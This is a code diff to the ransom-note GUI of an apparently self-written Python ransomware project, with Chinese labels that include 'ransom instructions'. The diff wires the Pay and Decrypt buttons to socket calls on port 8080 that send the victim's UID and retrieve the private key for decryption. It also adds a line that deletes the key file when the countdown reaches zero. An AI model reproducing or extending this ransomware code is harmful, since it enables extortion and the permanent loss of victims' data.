@@ -5,7 +5,9 @@ from PIL import Image, ImageTk
 import json
 import os
 import datetime
-#from mysocket import MySocket
+from ransomware.mysocket import MySocket
+from ransomware.mycrypto import runDecryption
+import threading
 
 def styles():
     style = ttk.Style()
@@ -71,6 +73,7 @@ def homePage():
                 label.after(1000,updateCountdown,label)
             else:
                 label.config(text="Time Left: 0")
+                os.remove("./data/key.json")
 
         TBFrame = tk.Frame(root,width=650,height=130,background="#910000",bd=2,relief="sunken")
         TBFrame.place(x=200,y=30)
@@ -98,11 +101,34 @@ def homePage():
         ttk.Label(RIFrame,text="勒索說明",style="RIT.TLabel").pack(side="top")
 
     def btn():
+        def __pay():
+            testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
+            s = MySocket.Client()
+            with open(testPath,"r") as file:
+                lock = json.load(file)
+            data = {
+                "getPrivate":False,
+                "UID": lock["UID"],
+                "padding": True
+            }
+            s.sendTCPMeg(data,8080)
+
+        def __decrypt():
+            def decrypt_in_thread():
+                testPath,__rmfolderPath = "./data/lock.json",f"C:/Users/{os.getlogin()}/AppData/Local/bkms/lock.json"
+                with open(testPath,"r") as file:
+                    lock = json.load(file)
+                s = MySocket.Client()
+                privateKey = s.sendGetPrivateKey(lock["UID"],8080)
+                print(privateKey)
+                runDecryption(root,privateKey)
+            threading.Thread(target=decrypt_in_thread).start()
+            
         btnFrame = tk.Frame(root,width=825,height=100,background="#910000")
         btnFrame.place(x = 30,y = 550)
         btnFrame.pack_propagate(False)
-        payBTN = ttk.Button(btnFrame,text="Pay",style="btn.TButton")
-        decryptionBTN = ttk.Button(btnFrame,text="Decrypto",style="btn.TButton")
+        payBTN = ttk.Button(btnFrame,text="Pay",style="btn.TButton",command=__pay)
+        decryptionBTN = ttk.Button(btnFrame,text="Decrypto",style="btn.TButton",command=__decrypt)
         payBTN.pack(side='left',padx=100)
         decryptionBTN.pack(side='right',padx=100)
 
